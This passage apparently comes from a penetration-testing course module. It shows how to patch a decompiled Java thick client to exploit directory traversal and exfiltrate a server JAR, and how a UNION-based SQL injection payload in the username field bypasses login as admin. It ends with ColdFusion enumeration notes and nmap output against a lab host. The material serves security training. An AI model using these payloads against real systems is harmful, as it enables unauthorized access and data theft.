    <span class="hljs-keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="hljs-keyword">this</span>.user))
      <span class="hljs-keyword">return</span> <span class="hljs-string">"Error: Method '"</span> + methodName + <span class="hljs-string">"' is not allowed for this user account"</span>; 
    <span class="hljs-keyword">this</span>.action = new ActionMessage(<span class="hljs-keyword">this</span>.sessionID, <span class="hljs-string">"files"</span>);
    <span class="hljs-keyword">this</span>.action.addArgument(folder);
    sendAndRecv();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.response.hasError())
      <span class="hljs-keyword">return</span> <span class="hljs-string">"Error: Your action caused an error on the application server!"</span>; 
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.response.getContentAsString();
  }
</code></pre>
<p>The <code>showFiles</code> function takes in one argument for the folder name and then sends the data to the server using the <code>sendAndRecv()</code> call. The file <code>fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java</code> sets the folder option. Let&#39;s read its content.</p>
<p>Code: java</p>
<pre><code class="lang-java">configs.addActionListener(<span class="hljs-keyword">new</span> ActionListener() {
          <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> actionPerformed(ActionEvent e) {
            <span class="hljs-keyword">String</span> response = <span class="hljs-string">""</span>;
            ClientGuiTest.<span class="hljs-keyword">this</span>.currentFolder = <span class="hljs-string">"configs"</span>;
            <span class="hljs-built_in">try</span> {
              response = ClientGuiTest.<span class="hljs-keyword">this</span>.invoker.showFiles(<span class="hljs-string">"configs"</span>);
            } <span class="hljs-built_in">catch</span> (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, <span class="hljs-string">"Failure during message building/parsing."</span>, <span class="hljs-string">"Error"</span>, <span class="hljs-number">0</span>);
            } <span class="hljs-built_in">catch</span> (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, <span class="hljs-string">"Unable to contact the server. If this problem remains, please close and reopen the client."</span>, <span class="hljs-string">"Error"</span>, <span class="hljs-number">0</span>);
            } 
            textPane.setText(response);
          }
        });
</code></pre>
<p>We can replace the <code>configs</code> folder name with <code>..</code> as follows.</p>
<p>Code: java</p>
<pre><code class="lang-java">ClientGuiTest.<span class="hljs-keyword">this</span>.currentFolder = <span class="hljs-string">".."</span>;
  <span class="hljs-keyword">try</span> {
    response = ClientGuiTest.<span class="hljs-keyword">this</span>.invoker.showFiles(<span class="hljs-string">".."</span>);
</code></pre>
<p>Next, compile the <code>ClientGuiTest.Java</code> file.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:<span class="hljs-symbol">\&gt;</span> javac -cp fatty-client-new.jar fatty-client-new.jar.src<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\f</span>atty<span class="hljs-symbol">\c</span>lient<span class="hljs-symbol">\g</span>ui<span class="hljs-symbol">\C</span>lientGuiTest.java
</code></pre>
<p>This generates several class files. Let&#39;s create a new folder and extract the contents of <code>fatty-client.jar</code> into it.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:\&gt; mkdir raw
C:\&gt; cp fatty-<span class="hljs-keyword">client</span>-<span class="hljs-keyword">new</span>.jar raw\fatty-<span class="hljs-keyword">client</span>-<span class="hljs-keyword">new</span><span class="hljs-number">-2.</span>jar
</code></pre>
<p>Navigate to the <code>raw</code> directory and decompress <code>fatty-client-new-2.jar</code> by right-clicking and selecting <code>Extract Here</code>. Overwrite any existing <code>htb/fatty/client/gui/*.class</code> files with updated class files.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:<span class="hljs-symbol">\&gt;</span> mv -Force fatty-client-new.jar.src<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\f</span>atty<span class="hljs-symbol">\c</span>lient<span class="hljs-symbol">\g</span>ui<span class="hljs-symbol">\*</span>.class raw<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\f</span>atty<span class="hljs-symbol">\c</span>lient<span class="hljs-symbol">\g</span>ui\
</code></pre>
<p>Finally, we build the new JAR file.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:\&gt; cd raw
C:\&gt; jar -cmf META-INF\MANIFEST<span class="hljs-selector-class">.MF</span> traverse<span class="hljs-selector-class">.jar</span> .
</code></pre>
<p>Let&#39;s log in to the application and navigate to <code>FileBrowser</code> -&gt; <code>Config</code> option.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/traverse.png" alt="traverse"></p>
<p>This is successful. We can now see the content of the directory <code>configs/../</code>. The files <code>fatty-server.jar</code> and <code>start.sh</code> look interesting. Listing the content of the <code>start.sh</code> file reveals that <code>fatty-server.jar</code> is running inside an Alpine Docker container.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/start.png" alt="start"></p>
<p>We can modify the <code>open</code> function in <code>fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java</code> to download the file <code>fatty-server.jar</code> as follows.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.io.FileOutputStream;
&lt;SNIP&gt;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> <span class="hljs-built_in">open</span>(<span class="hljs-keyword">String</span> foldername, <span class="hljs-keyword">String</span> filename) throws MessageParseException, MessageBuildException, IOException {
    <span class="hljs-keyword">String</span> methodName = (<span class="hljs-keyword">new</span> Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo(<span class="hljs-string">"[+] Method '"</span> + methodName + <span class="hljs-string">"' was called by user '"</span> + <span class="hljs-keyword">this</span>.user.getUsername() + <span class="hljs-string">"'."</span>);
    <span class="hljs-built_in">if</span> (AccessCheck.checkAccess(methodName, <span class="hljs-keyword">this</span>.user)) {
        <span class="hljs-built_in">return</span> <span class="hljs-string">"Error: Method '"</span> + methodName + <span class="hljs-string">"' is not allowed for this user account"</span>;
    }
    <span class="hljs-keyword">this</span>.action = <span class="hljs-keyword">new</span> ActionMessage(<span class="hljs-keyword">this</span>.sessionID, <span class="hljs-string">"open"</span>);
    <span class="hljs-keyword">this</span>.action.addArgument(foldername);
    <span class="hljs-keyword">this</span>.action.addArgument(filename);
    sendAndRecv();
    <span class="hljs-keyword">String</span> desktopPath = System.getProperty(<span class="hljs-string">"user.home"</span>) + <span class="hljs-string">"\\Desktop\\fatty-server.jar"</span>;
    FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(desktopPath);

    <span class="hljs-built_in">if</span> (<span class="hljs-keyword">this</span>.response.hasError()) {
        <span class="hljs-built_in">return</span> <span class="hljs-string">"Error: Your action caused an error on the application server!"</span>;
    }

    <span class="hljs-keyword">byte</span>[] content = <span class="hljs-keyword">this</span>.response.getContent();
    fos.<span class="hljs-built_in">write</span>(content);
    fos.<span class="hljs-built_in">close</span>();

    <span class="hljs-built_in">return</span> <span class="hljs-string">"Successfully saved the file to "</span> + desktopPath;
}
&lt;SNIP&gt;
</code></pre>
<p>Rebuild the JAR file by following the same steps and log in again to the application. Then, navigate to <code>FileBrowser</code> -&gt; <code>Config</code>, add the <code>fatty-server.jar</code> name in the input field, and click the <code>Open</code> button.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/download.png" alt="download"></p>
<p>The <code>fatty-server.jar</code> file is successfully downloaded onto our desktop, and we can start the examination.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">C:\</span>&gt; <span class="hljs-comment">ls</span> <span class="hljs-comment">C:\Users\cybervaca\Desktop\</span>

<span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-comment">SNIP</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>
<span class="hljs-comment">Mode</span>                <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">3/25/2023</span>  <span class="hljs-comment">11:38</span> <span class="hljs-comment">AM</span>       <span class="hljs-comment">10827452</span> <span class="hljs-comment">fatty</span><span class="hljs-literal">-</span><span class="hljs-comment">server</span><span class="hljs-string">.</span><span class="hljs-comment">jar</span>
</code></pre>
<hr>
<h3 id="sql-injection">SQL Injection</h3>
<p>Decompiling the <code>fatty-server.jar</code> using JD-GUI reveals the file <code>htb/fatty/server/database/FattyDbSession.class</code> that contains a <code>checkLogin()</code> function that handles the login functionality. This function retrieves user details based on the provided username. It then compares the retrieved password with the provided password.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> User checkLogin(User user) throws LoginException {
    &lt;SNIP&gt;
      rs = stmt.executeQuery(<span class="hljs-string">"SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="hljs-string">"'"</span>);
      &lt;SNIP&gt;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span><span class="hljs-type">User</span>.getPassword().equalsIgnoreCase(user.getPassword()))
          <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><span class="hljs-type">User</span>; 
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">LoginException</span>(<span class="hljs-string">"Wrong Password!"</span>);
      &lt;SNIP&gt;
           <span class="hljs-built_in">this</span>.logger.logError(<span class="hljs-string">"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="hljs-string">"' &lt;=="</span>);
      <span class="hljs-built_in">this</span>.logger.logError(<span class="hljs-string">"[-] Exception was: '"</span> + e.getMessage() + <span class="hljs-string">"'"</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
</code></pre>
<p>Let&#39;s check how the client application sends credentials to the server. The login button creates the new object <code>ClientGuiTest.this.user</code> for the <code>User</code> class. It then calls the <code>setUsername()</code> and <code>setPassword()</code> functions with the respective username and password values. The values that are returned from these functions are then sent to the server.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/logincode.png" alt="logincode"></p>
<p>Let&#39;s check the <code>setUsername()</code> and <code>setPassword()</code> functions from <code>htb/fatty/shared/resources/user.java</code>.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> setUsername(<span class="hljs-keyword">String</span> username) {
    <span class="hljs-keyword">this</span>.username = username;
  }

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> setPassword(<span class="hljs-keyword">String</span> password) {
    <span class="hljs-keyword">String</span> hashString = <span class="hljs-keyword">this</span>.username + password + <span class="hljs-string">"clarabibimakeseverythingsecure"</span>;
    MessageDigest digest = <span class="hljs-keyword">null</span>;
    <span class="hljs-keyword">try</span> {
      digest = MessageDigest.getInstance(<span class="hljs-string">"SHA-256"</span>);
    } <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } 
    <span class="hljs-built_in">byte</span>[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    <span class="hljs-keyword">this</span>.password = DatatypeConverter.printHexBinary(hash);
  }
</code></pre>
<p>The username is accepted without modification, but the password is changed to the format below.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-title">sha256</span><span class="hljs-params">(username+password+<span class="hljs-string">"clarabibimakeseverythingsecure"</span>)</span></span>
</code></pre>
<p>We also notice that the username isn&#39;t sanitized and is directly used in the SQL query, making it vulnerable to SQL injection.</p>
<p>Code: java</p>
<pre><code class="lang-java">rs = stmt.executeQuery("<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,username,email,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">role</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">'" + user.getUsername() + "'</span><span class="hljs-string">");</span>
</code></pre>
<p>The <code>checkLogin</code> function in <code>htb/fatty/server/database/FattyDbSession.class</code> writes the SQL exception to a log file.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-variable">&lt;SNIP&gt;</span>
    this.logger.<span class="hljs-keyword">log</span>Error(<span class="hljs-string">"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='"</span> + <span class="hljs-keyword">user</span>.getUsername() + <span class="hljs-string">"' &lt;=="</span>);
      this.logger.<span class="hljs-keyword">log</span>Error(<span class="hljs-string">"[-] Exception was: '"</span> + e.getMessage() + <span class="hljs-string">"'"</span>);
<span class="hljs-variable">&lt;SNIP&gt;</span>
</code></pre>
<p>Login into the application using the username <code>qtc&#39;</code> to validate the SQL injection vulnerability reveals a syntax error. To see the error, we need to edit the code in the <code>fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java</code> file as follows.</p>
<p>Code: java</p>
<pre><code class="lang-java">ClientGuiTest.<span class="hljs-keyword">this</span>.currentFolder = <span class="hljs-string">"../logs"</span>;
  <span class="hljs-keyword">try</span> {
    response = ClientGuiTest.<span class="hljs-keyword">this</span>.invoker.showFiles(<span class="hljs-string">"../logs"</span>);
</code></pre>
<p>Listing the content of the <code>error-log.txt</code> file reveals the following message.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/error.png" alt="error"></p>
<p>This confirms that the username field is vulnerable to SQL Injection. However, login attempts using payloads such as <code>&#39; or &#39;1&#39;=&#39;1</code> in both fields fail. Assuming that the username in the login form is <code>&#39; or &#39;1&#39;=&#39;1</code>, the server will process the username as below.</p>
<p>Code: sql</p>
<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,username,email,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">role</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">''</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span>
</code></pre>
<p>The above query succeeds and returns the first record in the database. The server then creates a new user object with the obtained results.</p>
<p>Code: java</p>
<pre><code class="lang-java">&lt;SNIP&gt;
<span class="hljs-keyword">if</span> (rs.next()) {
        int id = rs.getInt(<span class="hljs-string">"id"</span>);
        <span class="hljs-keyword">String</span> username = rs.getString(<span class="hljs-string">"username"</span>);
        <span class="hljs-keyword">String</span> email = rs.getString(<span class="hljs-string">"email"</span>);
        <span class="hljs-keyword">String</span> password = rs.getString(<span class="hljs-string">"password"</span>);
        <span class="hljs-keyword">String</span> role = rs.getString(<span class="hljs-string">"role"</span>);
        <span class="hljs-keyword">new</span><span class="hljs-type">User</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">User</span>(id, username, password, email, Role.getRoleByName(role), <span class="hljs-literal">false</span>);
&lt;SNIP&gt;
</code></pre>
<p>It then compares the newly created user password with the user-supplied password.</p>
<p>Code: java</p>
<pre><code class="lang-java">&lt;SNIP&gt;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span><span class="hljs-type">User</span>.getPassword().equalsIgnoreCase(user.getPassword()))
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><span class="hljs-type">User</span>;
<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">LoginException</span>(<span class="hljs-string">"Wrong Password!"</span>);
&lt;SNIP&gt;
</code></pre>
<p>Then, the following value is produced by <code>newUser.getPassword()</code> function.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-title">sha256</span><span class="hljs-params">(<span class="hljs-string">"qtc"</span>+<span class="hljs-string">"clarabibi"</span>+<span class="hljs-string">"clarabibimakeseverythingsecure"</span>)</span></span> = <span class="hljs-number">5</span>a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046
</code></pre>
<p>The user-supplied password hash <code>user.getPassword()</code> is calculated as follows.</p>
<p>Code: java</p>
<pre><code class="lang-java">sha256(<span class="hljs-string">"'</span> <span class="hljs-built_in">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1"</span> + <span class="hljs-string">"'</span> <span class="hljs-built_in">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1"</span> + <span class="hljs-string">"clarabibimakeseverythingsecure"</span>) = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
</code></pre>
<p>Although the hash sent to the server by the client doesn&#39;t match the one in the database, and the password comparison fails, the SQL injection is still possible using <code>UNION</code> queries. Let&#39;s consider the following example.</p>
<p>Code: sql</p>
<pre><code class="lang-sql">MariaDB [userdb]&gt; select * from users where username=<span class="hljs-emphasis">'john'</span>;
<span class="hljs-code">+----------+</span>-------------+
<span class="hljs-section">| username | password    |
+----------+-------------+</span>
<span class="hljs-section">| john     | password123 |
+----------+-------------+</span>
</code></pre>
<p>It is possible to create fake entries using the <code>SELECT</code> operator. Let&#39;s input an invalid username to create a new user entry.</p>
<p>Code: sql</p>
<pre><code class="lang-sql">MariaDB [userdb]&gt; select * from users where username=<span class="hljs-emphasis">'test'</span> union select <span class="hljs-emphasis">'admin'</span>, <span class="hljs-emphasis">'welcome123'</span>;
<span class="hljs-code">+----------+</span>-------------+
<span class="hljs-section">| username | password    |
+----------+-------------+</span>
<span class="hljs-section">| admin    | welcome123  |
+----------+-------------+</span>
</code></pre>
<p>Similarly, the injection in the <code>username</code> field can be leveraged to create a fake user entry.</p>
<p>Code: java</p>
<pre><code class="lang-java">test<span class="hljs-string">' UNION SELECT 1,'</span>invaliduse<span class="hljs-string">r','</span>invalid@a.<span class="hljs-string">b','</span>invalidpass<span class="hljs-string">','</span>admin
</code></pre>
<p>This way, the password, and the assigned role can be controlled. The following snippet of code sends the plaintext password entered in the form. Let&#39;s modify the code in <code>htb/fatty/shared/resources/User.java</code> to submit the password as it is from the client application.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> User(<span class="hljs-keyword">int</span> uid, <span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password, <span class="hljs-keyword">String</span> email, Role role) {
    <span class="hljs-keyword">this</span>.uid = uid;
    <span class="hljs-keyword">this</span>.username = username;
    <span class="hljs-keyword">this</span>.password = password;
    <span class="hljs-keyword">this</span>.email = email;
    <span class="hljs-keyword">this</span>.role = role;
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> setPassword(<span class="hljs-keyword">String</span> password) {
    <span class="hljs-keyword">this</span>.password = password;
  }
</code></pre>
<p>We can now rebuild the JAR file and attempt to log in using the payload <code>abc&#39; UNION SELECT 1,&#39;abc&#39;,&#39;a@b.com&#39;,&#39;abc&#39;,&#39;admin</code> in the <code>username</code> field and the random text <code>abc</code> in the <code>password</code> field.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/bypass.png" alt="bypass"></p>
<p>The server will eventually process the following query.</p>
<p>Code: sql</p>
<pre><code class="lang-sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span>,username,email,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">role</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'abc'</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-string">'abc'</span>,<span class="hljs-string">'a@b.com'</span>,<span class="hljs-string">'abc'</span>,<span class="hljs-string">'admin'</span>
</code></pre>
<p>The first select query fails, while the second returns valid user results with the role <code>admin</code> and the password <code>abc</code>. The password sent to the server is also <code>abc</code>, which results in a successful password comparison, and the application allows us to log in as the user <code>admin</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/admin.png" alt="admin"></p>
<h2 id="coldfusion-discovery-enumeration">ColdFusion - Discovery &amp; Enumeration</h2>
<hr>
<p>ColdFusion is a programming language and a web application development platform based on Java. ColdFusion was initially developed by the Allaire Corporation in 1995 and was acquired by Macromedia in 2001. Macromedia was later acquired by Adobe Systems, which now owns and develops ColdFusion.</p>
<p>It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion was first released in 1995 and has since evolved into a powerful and versatile platform for web development.</p>
<p>ColdFusion Markup Language (<code>CFML</code>) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks. For instance, the <code>cfquery</code> tag can execute SQL statements to retrieve data from a database:</p>
<p>Code: html</p>
<pre><code class="lang-html">&lt;cfquery <span class="hljs-built_in">name</span>=<span class="hljs-string">"myQuery"</span> datasource=<span class="hljs-string">"myDataSource"</span>&gt;
  <span class="hljs-built_in">SELECT</span> *
  <span class="hljs-keyword">FROM</span> myTable
&lt;/cfquery&gt;
</code></pre>
<p>Developers can then use the <code>cfloop</code> tag to iterate through the records retrieved from the database:</p>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">cfloop</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"myQuery"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>#myQuery.firstName# #myQuery.lastName#<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">cfloop</span>&gt;</span>
</code></pre>
<p>Thanks to its built-in functions and features, CFML enables developers to create complex business logic using minimal code. Moreover, ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to use their preferred programming language within the ColdFusion environment.</p>
<p>ColdFusion also offers support for email, PDF manipulation, graphing, and other commonly used features. The applications developed using ColdFusion can run on any server that supports its runtime. It is available for download from Adobe&#39;s website and can be installed on Windows, Mac, or Linux operating systems. ColdFusion applications can also be deployed on cloud platforms like Amazon Web Services or Microsoft Azure. Some of the primary purposes and benefits of ColdFusion include:</p>
<table>
<thead>
<tr>
<th><strong>Benefits</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Developing data-driven web applications</code></td>
<td>ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web applications quickly.</td>
</tr>
<tr>
<td><code>Integrating with databases</code></td>
<td>ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.</td>
</tr>
<tr>
<td><code>Simplifying web content management</code></td>
<td>One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.</td>
</tr>
<tr>
<td><code>Performance</code></td>
<td>ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of performance.</td>
</tr>
<tr>
<td><code>Collaboration</code></td>
<td>ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development, reduced time-to-market and quicker delivery of projects.</td>
</tr>
</tbody>
</table>
<p>Despite being less popular than other web development platforms, ColdFusion is still widely used by developers and organisations globally. Thanks to its ease of use, rapid application development capabilities, and integration with other web technologies, it is an ideal choice for building web applications quickly and efficiently. ColdFusion has evolved, with new versions periodically released since its inception.</p>
<p>The latest stable version of ColdFusion, as of this writing, is ColdFusion 2021, with ColdFusion 2023 about to enter Alpha. Earlier versions include ColdFusion 2018, ColdFusion 2016, and ColdFusion 11, each with new features and improvements such as better performance, more straightforward integration with other platforms, improved security, and enhanced usability.</p>
<p>Like any web-facing technology, ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. To improve the security of ColdFusion, developers must implement secure coding practices, input validation checks, and properly configure web servers and firewalls. Here are a few known vulnerabilities of ColdFusion:</p>
<ol>
<li>CVE-2021-21087: Arbitrary disallow of uploading JSP source code</li>
<li>CVE-2020-24453: Active Directory integration misconfiguration</li>
<li>CVE-2020-24450: Command injection vulnerability</li>
<li>CVE-2020-24449: Arbitrary file reading vulnerability</li>
<li>CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability</li>
</ol>
<p>ColdFusion exposes a fair few ports by default:</p>
<table>
<thead>
<tr>
<th>Port Number</th>
<th>Protocol</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Used for non-secure HTTP communication between the web server and web browser.</td>
</tr>
<tr>
<td>443</td>
<td>HTTPS</td>
<td>Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.</td>
</tr>
<tr>
<td>1935</td>
<td>RPC</td>
<td>Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.</td>
</tr>
<tr>
<td>25</td>
<td>SMTP</td>
<td>Simple Mail Transfer Protocol (SMTP) is used for sending email messages.</td>
</tr>
<tr>
<td>8500</td>
<td>SSL</td>
<td>Used for server communication via Secure Socket Layer (SSL).</td>
</tr>
<tr>
<td>5500</td>
<td>Server Monitor</td>
<td>Used for remote administration of the ColdFusion server.</td>
</tr>
</tbody>
</table>
<p>It&#39;s important to note that default ports can be changed during installation or configuration.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:</p>
<table>
<thead>
<tr>
<th><strong>Method</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Port Scanning</code></td>
<td>ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.</td>
</tr>
<tr>
<td><code>File Extensions</code></td>
<td>ColdFusion pages typically use &quot;.cfm&quot; or &quot;.cfc&quot; file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.</td>
</tr>
<tr>
<td><code>HTTP Headers</code></td>
<td>Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as &quot;Server: ColdFusion&quot; or &quot;X-Powered-By: ColdFusion&quot;, that can help identify the technology being used.</td>
</tr>
<tr>
<td><code>Error Messages</code></td>
<td>If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.</td>
</tr>
<tr>
<td><code>Default Files</code></td>
<td>ColdFusion creates several default files during installation, such as &quot;admin.cfm&quot; or &quot;CFIDE/administrator/index.cfm&quot;. Finding these files on the web server may indicate that the web application runs on ColdFusion.</td>
</tr>
</tbody>
</table>
<p><strong>NMap ports and service scan results</strong></p>
<p>ColdFusion - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span>- -sC -Pn <span class="hljs-number">10.129</span>.<span class="hljs-number">247.30</span> --<span class="hljs-keyword">open</span>

Starting Nmap <span class="hljs-number">7.92</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">45</span> GMT
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.30</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.028</span>s latency).
Not shown: <span class="hljs-number">65532</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)
Some closed ports may <span class="hljs-keyword">be</span> reported <span class="hljs-keyword">as</span> filtered due <span class="hljs-keyword">to</span> --defeat-rst-ratelimit
PORT      STATE SERVICE
<span class="hljs-number">135</span>/tcp   <span class="hljs-keyword">open</span>  msrpc
<span class="hljs-number">8500</span>/tcp  <span class="hljs-keyword">open</span>  fmtp
<span class="hljs-number">49154</span>/tcp <span class="hljs-keyword">open</span>  unknown

Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">350.38</span> seconds
</code></pre>
<p>The port scan results show three open ports. Two Windows RPC services, and one running on <code>8500</code>. As we know, <code>8500</code> is a default port that ColdFusion uses for SSL. Navigating to the <code>IP:8500</code> lists 2 directories, <code>CFIDE</code> and <code>cfdocs,</code> in the root, further indicating that ColdFusion is running on port 8500.</p>
